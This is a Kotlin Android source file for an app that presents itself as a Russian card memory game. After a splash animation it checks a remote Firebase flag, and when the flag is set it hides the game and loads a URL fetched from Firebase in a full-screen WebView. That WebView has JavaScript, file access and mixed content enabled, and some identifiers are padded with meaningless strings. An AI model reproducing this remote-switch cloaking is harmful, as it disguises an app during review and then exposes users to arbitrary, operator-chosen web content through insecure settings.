package daniil.kobitskoy.worktest.cardgamenew

import android.annotation.SuppressLint
import android.content.Context
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.view.animation.Animation
import android.view.animation.AnimationUtils
import android.webkit.*
import android.widget.AdapterView.OnItemClickListener
import android.widget.GridView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.fragment.app.FragmentTransaction
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import daniil.kobitskoy.worktest.cardgamenew.R
import daniil.kobitskoy.worktest.cardgamenew.databinding.ActivityMainBinding
import java.util.*


private var mGrid: GridView? = null
private var mAdapter: GridAdapter? = null

var GRID_SIZE: Int = 4
lateinit var binding: ActivityMainBinding
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)






        binding.button.setOnClickListener {
           // Log.d("check1", "list.toString()")

            var list = App().returnAttribution()
            val myDialogFragment = MyDialogFragment()
            val manager = supportFragmentManager
            //myDialogFragment.show(manager, "dialog")
            val transaction: FragmentTransaction = manager.beginTransaction()
            myDialogFragment.show(transaction, "dialog")
//            if(   list  == null){
//               val time = Toast.LENGTH_SHORT
//                val toas = Toast.makeText(this, "Подожди", time)
//               toas.show()
//            }else{
//                val time = Toast.LENGTH_SHORT
//                val toast = Toast.makeText(this, "$list", time)
//                toast.show()
//            }
            Log.d("check1", list.toString())



        }
        val lamano_3animatelamano_3= AnimationUtils.loadAnimation(this, R.anim.anvnseven)
        binding.MainText.startAnimation(lamano_3animatelamano_3)
        lamano_3animatelamano_3.setAnimationListener(object : Animation.AnimationListener {


            override fun onAnimationStart(pbindinganimatewebViewarraylisteningversion6234561: Animation?) {
            }

            override fun onAnimationEnd(animationlamano_3animatelamano_3: Animation?){
                if (hasConnection(this@MainActivity)){

                    FirebaseDatabase.getInstance().getReference("settings").child("isEnabled").addValueEventListener(object :
                        ValueEventListener {
                        override fun onDataChange(snapshotlamano_3animatelamano_3: DataSnapshot) {
                            if (snapshotlamano_3animatelamano_3.exists()) {
                                val isEnabled = snapshotlamano_3animatelamano_3.getValue(String::class.java)
                                Log.d("isEnabled", "$isEnabled")

                                if (isEnabled == "yes"){
                                    FirebaseDatabase.getInstance().getReference("settings").child("link").addValueEventListener(object :
                                        ValueEventListener {
                                        @SuppressLint("SetJavaScriptEnabled", "CutPasteId")
                                        override fun onDataChange(snapshotlamano_3animatelamano_3: DataSnapshot) {
                                            if (snapshotlamano_3animatelamano_3.exists()) {
                                                val link = snapshotlamano_3animatelamano_3.getValue(String::class.java)

                                                var webview = binding.webview
                                                webview.loadUrl(link.toString());
                                                val cookieManager = CookieManager.getInstance()
                                                cookieManager.setAcceptCookie(true)
                                                webview.settings.databaseEnabled = true
                                                webview.settings.setSupportZoom(false)
                                                webview.settings.allowFileAccess = true
                                                webview.settings.allowContentAccess = true
                                                webview.settings.loadWithOverviewMode = true
                                                webview.settings.useWideViewPort = true
                                                webview.settings.domStorageEnabled = true
                                                webview.settings.javaScriptEnabled = true
                                                webview.settings.useWideViewPort = true
                                                webview.settings.loadWithOverviewMode = true
                                                webview.settings.allowFileAccess = true
                                                webview.settings.javaScriptCanOpenWindowsAutomatically = true
                                                webview.settings.setSupportMultipleWindows(false)
                                                webview.settings.displayZoomControls = false
                                                webview.settings.builtInZoomControls = true
                                                webview.settings.setSupportZoom(true)
                                                webview.settings.pluginState = WebSettings.PluginState.ON
                                                webview.settings.mixedContentMode = 0
                                                webview.settings.setAppCacheEnabled(true)
                                                webview.settings.allowContentAccess = true

                                                webview.webViewClient = object : WebViewClient() {
                                                    @SuppressLint("SetJavaScriptEnabled")
                                                    override fun shouldOverrideUrlLoading(viewlamano_3animatelamano_3: WebView?, urllamano_3animatelamano_3: String?): Boolean {
                                                        viewlamano_3animatelamano_3?.loadUrl(urllamano_3animatelamano_3!!)
                                                        return true
                                                    }
                                                    override fun onPageFinished(viewlamano_3animatelamano_3: WebView?, urllamano_3animatelamano_3: String?) {
                                                        super.onPageFinished(viewlamano_3animatelamano_3, urllamano_3animatelamano_3)

                                                        webview?.visibility = View.VISIBLE
                                                        binding.button.visibility = View.GONE
                                                        binding.field.visibility = View.GONE
                                                        binding.loading.visibility= View.GONE

                                              //          Log.d("ShishaLoundgeBar", "onPageFinishedarraylisteningversion6234561:$massivlamano_32")
                                                    }
                                                    @RequiresApi(Build.VERSION_CODES.M)
                                                    override fun onReceivedError(
                                                        viewlamano_3animatelamano_3: WebView?,
                                                        requestlamano_3animatelamano_3: WebResourceRequest?,
                                                        errorlamano_3animatelamano_3: WebResourceError?
                                                    ) {
                                                        super.onReceivedError(viewlamano_3animatelamano_3, requestlamano_3animatelamano_3, errorlamano_3animatelamano_3)
                                                        if (errorlamano_3animatelamano_3?.errorCode == 404) {
                                                            Log.d("error", "onReceivedError: ")
                                                            webview.visibility = View.GONE
                                                            binding.field.visibility = View.VISIBLE
                                                            binding.button.visibility = View.VISIBLE
                                                            
                                                        }
                                                    }

                                                    override fun onReceivedHttpError(
                                                        viewlamano_3animatelamano_3: WebView?,
                                                        requestlamano_3animatelamano_3: WebResourceRequest?,
                                                        errorResponselamano_3animatelamano_3: WebResourceResponse?
                                                    ) {
                                                        super.onReceivedHttpError(viewlamano_3animatelamano_3, requestlamano_3animatelamano_3, errorResponselamano_3animatelamano_3)
                                                        if (errorResponselamano_3animatelamano_3?.statusCode == 404) {
                                                            Log.d("error12341", "onReceivedErrorarraylisteningversion6234561: ")
                                                            webview.visibility = View.GONE
                                                            binding.field.visibility = View.VISIBLE
                                                            binding.button.visibility = View.VISIBLE

                                                        }
                                                    }



                                                }


                                                if (savedInstanceState == null) {
                                                    if (link != null) {
                                                        webview.loadUrl(link)
                                                    }
                                                }else{
                                                    webview.loadUrl(link!!)
                                                }
                                            }
                                        }

                                        override fun onCancelled(errorlamano_3animatelamano_3: DatabaseError) {

                                        }
                                    })


                                }else{

                                    findViewById<WebView>(R.id.webview).visibility = View.GONE
                                    binding.loading.visibility = View.GONE
                                    binding.button.visibility = View.VISIBLE
                                    binding.field.visibility = View.VISIBLE


                                }
                            }
                        }

                        override fun onCancelled(errorlamano_3animatelamano_3: DatabaseError) {

                        }
                    })

                }else{

                }
            }
            override fun onAnimationRepeat(animationlamano_3animatelamano_3: Animation?){

            }
        })
        mGrid = findViewById<View>(R.id.field) as? GridView
        mGrid!!.numColumns = GRID_SIZE
        mGrid!!.isEnabled = true

        mAdapter = GridAdapter(this, GRID_SIZE, GRID_SIZE)
        mGrid!!.adapter = mAdapter

        mGrid!!.onItemClickListener =
            OnItemClickListener { parent, v, position, id ->
                mAdapter!!.checkOpenCells()
                mAdapter!!.openCell(position)
                if (mAdapter!!.checkGameOver()) Toast.makeText(
                    applicationContext,
                    "Игра закончена",
                    Toast.LENGTH_SHORT
                ).show()
            }


    }


override fun onKeyDown(keyCodelamano_3animatelamano_3: Int, eventlamano_3animatelamano_3: KeyEvent?): Boolean {
    if ((keyCodelamano_3animatelamano_3 == KeyEvent.KEYCODE_BACK) && binding.webview.canGoBack()) {
        binding.webview.goBack()
        return true
    }

    return super.onKeyDown(keyCodelamano_3animatelamano_3, eventlamano_3animatelamano_3)
}
    override fun onBackPressed() {
        super.onBackPressed()
        if ( binding.webview.isFocused() &&  binding.webview.canGoBack()) {
            binding.webview.goBack()
        } else {
            super.onBackPressed()
        }
    }
    fun hasConnection(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        var webManager = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
        if (webManager != null && webManager.isConnected) {
            return true
        }
        webManager = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
        if (webManager != null && webManager.isConnected) {
            return true
        }
        webManager = connectivityManager.activeNetworkInfo
        return webManager != null && webManager.isConnected
    }
}
